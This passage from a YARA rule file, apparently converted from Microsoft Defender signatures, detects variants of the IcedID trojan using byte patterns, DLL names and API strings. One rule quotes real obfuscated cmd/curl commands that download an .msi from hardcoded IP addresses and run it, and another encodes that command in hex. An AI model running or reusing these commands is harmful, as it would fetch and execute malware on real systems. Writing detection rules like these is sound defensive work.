        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {44 0f af 46 54 2d ab 9f 01 00 09 46 04 48 8b 86 c0 00 00 00 41 8b d0 c1 ea 08 88 14 01 ff 46 60 8b 86 e8 00 00 00 48 63 4e 60 2d 93 ab 18 00 01 86 90 00 00 00 48 8b 86 c0 00 00 00 44 88 04 01 ff 46 60 8b 86 ec 00 00 00 ff c8}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MQ_2147819701_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MQ!MTB"
        threat_id = "2147819701"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "lCqBdez5vu.dll" ascii //weight: 1
        $x_1_3 = "BXdAixCmKS" ascii //weight: 1
        $x_1_4 = "HyOrVQRWaI" ascii //weight: 1
        $x_1_5 = "PYDEknOmqN" ascii //weight: 1
        $x_1_6 = "TwZHXRjUouF" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MQ_2147819701_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MQ!MTB"
        threat_id = "2147819701"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "aisukfjnuashfkasijfuhaksjudhikj" ascii //weight: 10
        $x_5_2 = "D78625d9e5fcb4e692c8bf4933d71f99" ascii //weight: 5
        $x_5_3 = "4798472d20db0505048848b55618ab59" ascii //weight: 5
        $x_1_4 = "DuplicateHandle" ascii //weight: 1
        $x_1_5 = "EnumResourceNames" ascii //weight: 1
        $x_1_6 = "VirtualAlloc" ascii //weight: 1
        $x_1_7 = "GetCurrentProcess" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_5_*) and 4 of ($x_1_*))) or
            ((1 of ($x_10_*) and 2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_DL_2147819922_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DL!MTB"
        threat_id = "2147819922"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b c1 b9 ?? ?? ?? ?? 48 f7 f1 48 8b c2 0f b6 44 04 ?? 8b 8c 24 ?? ?? ?? ?? 33 c8 8b c1 b9 ?? ?? ?? ?? 48 6b c9 ?? 0f be 8c 0c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DN_2147820002_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DN!MTB"
        threat_id = "2147820002"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "ieUsH4.dll" ascii //weight: 10
        $x_1_2 = "AVtWHXGc" ascii //weight: 1
        $x_1_3 = "BbVGGPdJMOG" ascii //weight: 1
        $x_1_4 = "CCCJqdBK" ascii //weight: 1
        $x_1_5 = "DYeXlBBftmq" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DO_2147820247_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DO!MTB"
        threat_id = "2147820247"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "h7E3y.dll" ascii //weight: 10
        $x_1_2 = "weyuhiadsjmkajui" ascii //weight: 1
        $x_1_3 = "CoDosDateTimeToFileTime" ascii //weight: 1
        $x_1_4 = "RasDeleteEntryA" ascii //weight: 1
        $x_1_5 = "BindMoniker" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MR_2147821365_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MR!MTB"
        threat_id = "2147821365"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {48 8b 44 24 28 48 89 44 24 08 eb 31 48 8b 44 24 20 48 89 04 24 eb e9 88 08 48 8b 04 24 eb a9 48 8b 44 24 08 48 ff c0 eb a8 48 8b 4c 24 08 8a 09 eb e5 48 8b 44 24 20 48 83 c4 18 eb}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MR_2147821365_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MR!MTB"
        threat_id = "2147821365"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "27"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "giansfuhydasjkiasufhbasjkdasudha" ascii //weight: 10
        $x_10_2 = {22 20 0b 02 ?? ?? 00 1a 00 00 00 de 01 00 00 00 00 00 00 10 00 00 00 10 00 00 00 00 00 80 01}  //weight: 10, accuracy: Low
        $x_5_3 = ".tdata" ascii //weight: 5
        $x_1_4 = "SetConsoleWindowInfo" ascii //weight: 1
        $x_1_5 = "SetConsoleDisplayMode" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MR_2147821365_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MR!MTB"
        threat_id = "2147821365"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "ueWJ2y.dll" ascii //weight: 10
        $x_10_2 = "Rkpvwk.dll" ascii //weight: 10
        $x_10_3 = "uNO9ah.dll" ascii //weight: 10
        $x_5_4 = "PluginInit" ascii //weight: 5
        $x_1_5 = "DeleteEnhMetaFile" ascii //weight: 1
        $x_1_6 = "CreateClassMoniker" ascii //weight: 1
        $x_1_7 = "GetHGlobalFromILockBytes" ascii //weight: 1
        $x_1_8 = "IEUWi3zF8T" ascii //weight: 1
        $x_1_9 = "SF3NTEhp6Lh" ascii //weight: 1
        $x_1_10 = "X2M0fxZABxN" ascii //weight: 1
        $x_1_11 = "ImmGetIMEFileNameW" ascii //weight: 1
        $x_1_12 = "ImmRegisterWordW" ascii //weight: 1
        $x_1_13 = "ScriptStringFree" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 8 of ($x_1_*))) or
            ((1 of ($x_10_*) and 1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MS_2147821406_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MS!MTB"
        threat_id = "2147821406"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {66 c7 40 18 2f 6b 48 8b f1 eb d3 48 89 70 20 57 eb 15 0f b6 c1 0f 46 d0 eb 00 42 88 54 04 20 49 ff c0 e9}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MS_2147821406_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MS!MTB"
        threat_id = "2147821406"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "6pMjvr.dll" ascii //weight: 10
        $x_1_2 = "uijnsdvfbgsz" ascii //weight: 1
        $x_1_3 = "XjFRi3eLfrF" ascii //weight: 1
        $x_1_4 = "EBjWaw" ascii //weight: 1
        $x_1_5 = "VWDR47iyu" ascii //weight: 1
        $x_1_6 = "mUL0ZHloUaJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MS_2147821406_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MS!MTB"
        threat_id = "2147821406"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "21"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "uaygshidjudshygahsijodajsfuasjkfas" ascii //weight: 10
        $x_10_2 = "yguashindjaiushdyfuhiasodjuhygahsjksd" ascii //weight: 10
        $x_10_3 = "yugaenjakdsuhygfruhjwekuhewbyujass" ascii //weight: 10
        $x_5_4 = {18 00 00 00 2a 03 00 00 00 00 00 00 10 00 00 00 10 00 00 00 00 00 80 01 00 00 00 00 10 00 00 00 02 00 00 06}  //weight: 5, accuracy: High
        $x_2_5 = "DuplicateHandle" ascii //weight: 2
        $x_2_6 = "WaitForMultipleObjectsEx" ascii //weight: 2
        $x_2_7 = "CreateEventW" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_5_*) and 3 of ($x_2_*))) or
            ((2 of ($x_10_*) and 1 of ($x_2_*))) or
            ((2 of ($x_10_*) and 1 of ($x_5_*))) or
            ((3 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_2147821722_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MT!MTB"
        threat_id = "2147821722"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MT: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "25"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "h1kFMQ.dll" ascii //weight: 10
        $x_10_2 = "PluginInit" ascii //weight: 10
        $x_1_3 = "ICOpenFunction" ascii //weight: 1
        $x_1_4 = "ICSendMessage" ascii //weight: 1
        $x_1_5 = "CombineTransform" ascii //weight: 1
        $x_1_6 = "GetRandomRgn" ascii //weight: 1
        $x_1_7 = "ExtCreateRegion" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_2147821722_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MT!MTB"
        threat_id = "2147821722"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MT: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "23"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "aisukfjnuashfkasijfuhaksjudhikj" ascii //weight: 10
        $x_5_2 = {22 00 00 00 ba 00 00 00 00 00 00 00 00 00 00 00 10 00 00 00 00 00 80 01 00 00 00 00 10 00 00 00 02 00 00 06}  //weight: 5, accuracy: High
        $x_2_3 = "EnumResourceLanguagesExW" ascii //weight: 2
        $x_2_4 = "EnumResourceNamesW" ascii //weight: 2
        $x_2_5 = "DuplicateHandle" ascii //weight: 2
        $x_2_6 = "GetCurrentProcess" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_2147821722_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MT!MTB"
        threat_id = "2147821722"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MT: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "c:\\windows\\system32\\cmd.exe /c c^u^r^l -o c:\\users\\public\\dS.msi http://135.125.177.82/UMYApd4/uwY&&timeout 15&&c:\\users\\public\\dS.msi" ascii //weight: 5
        $x_5_2 = "c:\\windows\\system32\\cmd.exe /c c^u^r^l -o c:\\users\\public\\eT6CqSiL.msi http://95.164.17.59/ZIbr7/7frhd&&timeout 15&&c:\\users\\public\\eT6CqSiL.msi" ascii //weight: 5
        $x_5_3 = "c:\\windows\\system32\\cmd.exe /c c^u^r^l -o c:\\users\\public\\yl.msi http://135.125.177.95/syK/cxfGmJ&&timeout 15&&c:\\users\\public\\yl.msi" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win64_IcedID_MU_2147821728_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MU!MTB"
        threat_id = "2147821728"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {48 8d 44 3e 10 48 ba 61 61 61 61 61 61 61 61 31 c9 49 89 f0 48 89 10 48 89 50 08 48 89 50 10 48 89 50 18 48 89 50 20 48 89 50 28 48 89 50 30 48 89 50 38 49 63 c7 31 d2 c6 44 04 20 00 c6 44 1c 20 00 ff 15 ea 68 08 00}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MU_2147821728_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MU!MTB"
        threat_id = "2147821728"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "RunObject" ascii //weight: 10
        $x_1_2 = "QS07Jc.dll" ascii //weight: 1
        $x_1_3 = "AHpOwJwdb" ascii //weight: 1
        $x_1_4 = "BSKKXKhWAe" ascii //weight: 1
        $x_1_5 = "DGCmoLRaVhY" ascii //weight: 1
        $x_1_6 = "WnOrZsaxGAn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MU_2147821728_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MU!MTB"
        threat_id = "2147821728"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "acpnlhbcdxndk" ascii //weight: 2
        $x_2_2 = "almhqnvidm" ascii //weight: 2
        $x_2_3 = "bwhtzylszkxhuevs" ascii //weight: 2
        $x_2_4 = "fdpxaemcfetomppm" ascii //weight: 2
        $x_1_5 = "SetFileApisToOEM" ascii //weight: 1
        $x_1_6 = "GetTickCount" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MU_2147821728_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MU!MTB"
        threat_id = "2147821728"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {63 3a 5c 77 69 6e 64 6f 77 73 5c 73 79 73 74 65 6d 33 32 5c 63 6d 64 2e 65 78 65 20 2f 63 20 63 5e 75 5e 72 5e 6c 20 2d 6f 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-16] 2e 6d 73 69 20 68 74 74 70 3a 2f 2f [0-21] 2f [0-16] 2f [0-16] 26 26 74 69 6d 65 6f 75 74 20 31 35 26 26 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c [0-16] 2e 6d 73 69}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BK_2147822272_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BK!MTB"
        threat_id = "2147822272"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CnvDvh" ascii //weight: 1
        $x_1_2 = "LKgkI4Ic" ascii //weight: 1
        $x_1_3 = "MAS0wX60TD6" ascii //weight: 1
        $x_1_4 = "PluginInit" ascii //weight: 1
        $x_1_5 = "YwIjrGpsp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BK_2147822272_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BK!MTB"
        threat_id = "2147822272"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {41 f7 ec c1 fa 04 8b c2 c1 e8 1f 03 d0 49 63 c4 41 83 c4 01 48 63 ca 48 6b c9 35 48 03 c8 48 8b 44 24 28 42 0f b6 8c 31 [0-4] 41 32 4c 00 ff 43 88 4c 18 ff 44 3b 64 24 20 72}  //weight: 4, accuracy: Low
        $x_1_2 = "6>>rsEEoYCXk2$MrILsvR$WQyTU6Fl5RVggTWehq>#S1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MV_2147822281_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MV!MTB"
        threat_id = "2147822281"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "akvbwmhqzempyeej" ascii //weight: 2
        $x_2_2 = "alswdzrowmqllvbq" ascii //weight: 2
        $x_2_3 = "cakuizuzexva" ascii //weight: 2
        $x_2_4 = "hxxxxxylvktldy" ascii //weight: 2
        $x_1_5 = "GetCapture" ascii //weight: 1
        $x_1_6 = "InitNetworkAddressControl" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MV_2147822281_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MV!MTB"
        threat_id = "2147822281"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "19"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "KHgytU.dll" ascii //weight: 10
        $x_10_2 = "hmpSgS.dll" ascii //weight: 10
        $x_5_3 = "PluginInit" ascii //weight: 5
        $x_1_4 = "CnvDvh" ascii //weight: 1
        $x_1_5 = "MAS0wX60TD6" ascii //weight: 1
        $x_1_6 = "YwIjrGpsp" ascii //weight: 1
        $x_1_7 = "bVNptJMKv" ascii //weight: 1
        $x_1_8 = "GsIzM1" ascii //weight: 1
        $x_1_9 = "L9jbbn6uT1U" ascii //weight: 1
        $x_1_10 = "iGziRQsP" ascii //weight: 1
        $x_1_11 = "rIJlAck" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_5_*) and 4 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MV_2147822281_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MV!MTB"
        threat_id = "2147822281"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "23"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = "ghuasifmijoashudadjkasidjasduhi" ascii //weight: 10
        $x_10_2 = "yuisafmklajishudfbhajkhdusgyhjsa" ascii //weight: 10
        $x_5_3 = {22 20 0b 02 ?? ?? 00 16 00 00 00 0e 03 00 00 00 00 00 00 00 00 00 00 10 00 00 00 00 00 80 01 00 00 00 00 10 00 00 00 02 00 00 06}  //weight: 5, accuracy: Low
        $x_2_4 = "DuplicateHandle" ascii //weight: 2
        $x_2_5 = "WaitForMultipleObjectsEx" ascii //weight: 2
        $x_2_6 = "CreateEventW" ascii //weight: 2
        $x_2_7 = "OpenProcess" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 1 of ($x_5_*) and 4 of ($x_2_*))) or
            ((2 of ($x_10_*) and 2 of ($x_2_*))) or
            ((2 of ($x_10_*) and 1 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_MW_2147822457_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MW!MTB"
        threat_id = "2147822457"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {41 f7 ec 41 03 d4 c1 fa 04 8b c2 c1 e8 1f 03 d0 41 8b c4 41 ff c4 6b d2 1d 2b c2 48 63 c8 48 8b 44 24 28 42 8a 8c 31 ?? ?? ?? ?? 41 32 0c 00 43 88 0c 18 49 ff c0 44 3b 64 24 20 72}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MW_2147822457_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MW!MTB"
        threat_id = "2147822457"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "RunObject" ascii //weight: 10
        $x_1_2 = "q3mguG5V.dll" ascii //weight: 1
        $x_1_3 = "DGlD9F7thE" ascii //weight: 1
        $x_1_4 = "IrPUqN5s6FV" ascii //weight: 1
        $x_1_5 = "eQjKujh" ascii //weight: 1
        $x_1_6 = "lNgtnJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MW_2147822457_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MW!MTB"
        threat_id = "2147822457"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "PluginInit" ascii //weight: 10
        $x_1_2 = "TAbZ96.dll" ascii //weight: 1
        $x_1_3 = "AnVnst6" ascii //weight: 1
        $x_1_4 = "FeZ1qHQ8T7" ascii //weight: 1
        $x_1_5 = "g3hxblANc7K" ascii //weight: 1
        $x_1_6 = "zNM5lWs7LQ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MW_2147822457_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MW!MTB"
        threat_id = "2147822457"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {48 8b 44 24 40 48 89 44 24 10 eb ?? 48 89 44 24 40 48 83 7c 24 10 00 76 ?? eb ?? 48 8b 44 24 30 48 83 c4 28 eb ?? 4c 89 44 24 18 48 89 54 24 10 eb ?? 8a 09 88 08 eb}  //weight: 10, accuracy: Low
        $x_5_2 = "Jnasdhbjasds" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_DP_2147822963_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.DP!MTB"
        threat_id = "2147822963"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "61gwwb27.dll" ascii //weight: 10
        $x_1_2 = "HvsHUtxxN" ascii //weight: 1
        $x_1_3 = "ihnzWOu1YM8" ascii //weight: 1
        $x_1_4 = "vSPhkRLISP8" ascii //weight: 1
        $x_1_5 = "UhApX7EEt" ascii //weight: 1
        $x_10_6 = "NCwXdqaN.dll" ascii //weight: 10
        $x_1_7 = "CfEqpClzoO" ascii //weight: 1
        $x_1_8 = "EIS8YIH1saE" ascii //weight: 1
        $x_1_9 = "Ej7UAwhkG6g" ascii //weight: 1
        $x_1_10 = "Q4vbl4jc48M" ascii //weight: 1
        $x_10_11 = "Uriq72Um.dll" ascii //weight: 10
        $x_1_12 = "HHODjb3B" ascii //weight: 1
        $x_1_13 = "IDRNRMb" ascii //weight: 1
        $x_1_14 = "ROrQcbN746" ascii //weight: 1
        $x_1_15 = "byZIHLqrJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 4 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win64_IcedID_BM_2147823094_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BM!MTB"
        threat_id = "2147823094"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C6L2sJK" ascii //weight: 1
        $x_1_2 = "FVi6h1" ascii //weight: 1
        $x_1_3 = "RunObject" ascii //weight: 1
        $x_1_4 = "Z65PdSt" ascii //weight: 1
        $x_1_5 = "a6WDHrfsa6" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BM_2147823094_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BM!MTB"
        threat_id = "2147823094"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "AykIrxlWgS" ascii //weight: 1
        $x_1_2 = "I9QWF4E" ascii //weight: 1
        $x_1_3 = "M4YPDQn" ascii //weight: 1
        $x_1_4 = "PgZtUIwL29" ascii //weight: 1
        $x_1_5 = "Pn3ZZh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BM_2147823094_2
{
    meta:
        author = "defender2yara"
